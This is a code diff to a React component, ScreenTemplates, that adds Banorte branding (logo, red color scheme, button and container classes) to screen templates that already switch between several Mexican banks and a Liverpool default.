@@ -8,6 +8,7 @@ import citibanamexLogo from '../../assets/Banamex.png';
 import banbajioLogo from '../../assets/banbajio_logo_oficial.png';
 import bbvaLogo from '../../assets/bbva_logo.png';
 import bbvaLogoWhite from '../../assets/bbva_logo_white.png';
+import banorteLogo from '../../assets/banorte_logo.png';
 
 interface ScreenTemplatesProps {
   currentScreen: ScreenType;
@@ -60,6 +61,13 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
           </div>
         );
       } else if (banco === 'BBVA') {
+        return (
+          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
+            {bankLogo()}
+            {children}
+          </div>
+        );
+      } else if (banco === 'BANORTE') {
         return (
           <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
             {bankLogo()}
@@ -359,6 +367,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 banco === 'BANBAJIO' ? 'banbajio-bg' : 
                 banco === 'CITIBANAMEX' ? 'bg-[#0070BA]' : 
                 banco === 'BBVA' ? 'bg-[#072146]' :
+                banco === 'BANORTE' ? 'bg-[#EC1C24]' :
                 'bg-[#e10098]'
               } animate-progress-bar`}></div>
             </div>
@@ -387,6 +396,8 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         return 'banbajio-button'; // Ya tiene todos los estilos definidos en el CSS
       case 'BBVA':
         return 'bbva-button';
+      case 'BANORTE':
+        return 'bg-[#EC1C24] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
       default:
         return 'bg-[#e10098] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors'; // Liverpool
     }
@@ -402,6 +413,8 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         return <img src={banbajioLogo} alt="BanBajío" className="h-16 mx-auto mb-4" />;
       case 'BBVA':
         return <img src={bbvaLogoWhite} alt="BBVA" className="h-16 mx-auto mb-4 white-logo" />;
+      case 'BANORTE':
+        return <img src={banorteLogo} alt="Banorte" className="h-16 mx-auto mb-4" />;
       default:
         return <img src={liverpoolLogo} alt="Liverpool" className="h-16 mx-auto mb-4" />;
     }
@@ -413,6 +426,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
       case 'BANBAJIO': return 'banbajio-header';
       case 'CITIBANAMEX': return 'citibanamex-header';
       case 'BBVA': return 'bbva-header';
+      case 'BANORTE': return 'banorte-header';
       default: return 'bg-gray-100 p-3 text-center font-semibold';
     }
   };
@@ -423,6 +437,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
       case 'BANBAJIO': return 'bg-white p-4 rounded-lg shadow';
       case 'CITIBANAMEX': return 'citibanamex-container';
       case 'BBVA': return 'bbva-container';
+      case 'BANORTE': return 'banorte-container';
       default: return '';
     }
   };
